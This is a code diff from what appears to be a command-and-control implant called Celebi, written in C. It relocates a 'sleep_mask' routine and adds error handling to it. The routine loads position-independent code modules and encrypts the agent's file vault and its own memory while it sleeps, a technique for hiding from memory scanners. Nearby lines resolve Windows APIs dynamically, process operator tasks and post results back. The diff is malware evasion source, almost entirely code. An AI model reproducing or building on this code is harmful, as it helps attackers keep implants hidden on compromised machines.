@@ -34,31 +34,6 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void sleep_mask(AgentState *state) {
-	// Resolve built-in PICOs used for masking.
-	ResolvedPico mask_vault = { 0 };
-	ResolvedPico mask_sleep = { 0 };
-	
-	resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_vault, state->builtin_picos.mask_vault); // no error handling for now TODO
-	resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_sleep, state->builtin_picos.mask_sleep); // no error handling for now TODO
-	
-	MASK_VAULT_PICO mask_vault_entrypoint = (MASK_VAULT_PICO) mask_vault.entrypoint;
-	MASK_SLEEP_PICO mask_sleep_entrypoint = (MASK_SLEEP_PICO) mask_sleep.entrypoint;
-
-	// Mask vault.
-	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
-
-	// Mask agent and sleep...
-	mask_sleep_entrypoint(NULL, state->sleep_time, ENC_KEY, ENC_KEY_LEN);
-	
-	// Unmask vault.
-	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
-	
-	// Free resolved PICOs.
-	free_resolved_pico(&mask_vault);
-	free_resolved_pico(&mask_sleep);
-}
-
 void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
 	TaskPostReply reply = { 0 };
 	BOOL result;
@@ -335,6 +310,32 @@ void process_task(TaskInfo *task, AgentState *state) {
 	#ifdef CELEBI_DEBUG
 	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
 	#endif
+}
+
+void sleep_mask(AgentState *state) {
+	// Resolve built-in PICOs used for masking.
+	ResolvedPico mask_vault = { 0 };
+	ResolvedPico mask_sleep = { 0 };
+	
+	// If we can't resolve the required PICOs, gracefully crash.
+	if (resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_vault, state->builtin_picos.mask_vault) == FALSE) { agent_exit(state, NULL); }
+	if (resolve_loaded_pico(&state->file_vault, &state->funcs, &mask_sleep, state->builtin_picos.mask_sleep) == FALSE) { agent_exit(state, NULL); }
+	
+	MASK_VAULT_PICO mask_vault_entrypoint = (MASK_VAULT_PICO) mask_vault.entrypoint;
+	MASK_SLEEP_PICO mask_sleep_entrypoint = (MASK_SLEEP_PICO) mask_sleep.entrypoint;
+
+	// Mask vault.
+	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
+
+	// Mask agent and sleep...
+	mask_sleep_entrypoint(NULL, state->sleep_time, ENC_KEY, ENC_KEY_LEN);
+	
+	// Unmask vault.
+	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
+	
+	// Free resolved PICOs.
+	free_resolved_pico(&mask_vault);
+	free_resolved_pico(&mask_sleep);
 }
 
 void go() {
